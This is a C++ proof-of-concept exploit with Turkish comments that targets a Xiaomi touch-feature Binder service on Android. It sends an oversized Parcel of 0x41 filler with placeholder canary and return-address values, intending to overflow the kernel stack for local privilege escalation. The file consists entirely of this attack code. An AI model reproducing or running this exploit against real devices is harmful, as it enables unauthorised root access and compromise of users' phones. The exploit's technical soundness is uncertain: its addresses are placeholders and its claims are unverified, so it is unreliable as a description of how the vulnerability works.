/*
 * Binder Proxy PoC: ITouchFeature to Kernel Stack Overflow
 * Target: vendor.xiaomi.hw.touchfeature@1.0::ITouchFeature
 */

#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <utils/String16.h>
#include <vector>

using namespace android;

// ITouchFeature transaction code for setModeLongValue (Xiaomi specific)
#define TRANSACTION_setModeLongValue 12

void trigger_lpe_via_binder() {
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> binder = sm->getService(String16("vendor.xiaomi.hw.touchfeature@1.0::ITouchFeature"));

    if (binder == NULL) {
        printf("[-] Servis bulunamadi. Erişim engellenmiş olabilir veya servis adi farkli.\n");
        return;
    }

    Parcel data, reply;
    data.writeInterfaceToken(String16("vendor.xiaomi.hw.touchfeature@1.0::ITouchFeature"));

    data.writeInt32(0);   // deviceId
    data.writeInt32(15);  // mode (Grip Mode)
    data.writeInt32(256); // value_len: Kernel stack'ini tasirtan kritik uzunluk

    // Payload: Stack'i ezecek olan veriler
    std::vector<int32_t> payload(256, 0x41414141);
    payload[254] = 0xDEADBEEF; // Canary / Frame Pointer
    payload[255] = 0xBADF00D;  // Return Address (ROP Start)

    data.writeInt32Vector(payload);

    printf("[+] Binder Proxy uzerinden Kernel Stack OOB tetikleniyor...\n");
    status_t status = binder->transact(TRANSACTION_setModeLongValue, data, &reply);

    if (status == OK) {
        printf("[+] Transact basarili. Kernel yanit verdi.\n");
    } else {
        printf("[-] Transact hatasi: %d\n", status);
    }
}

int main() {
    trigger_lpe_via_binder();
    return 0;
}
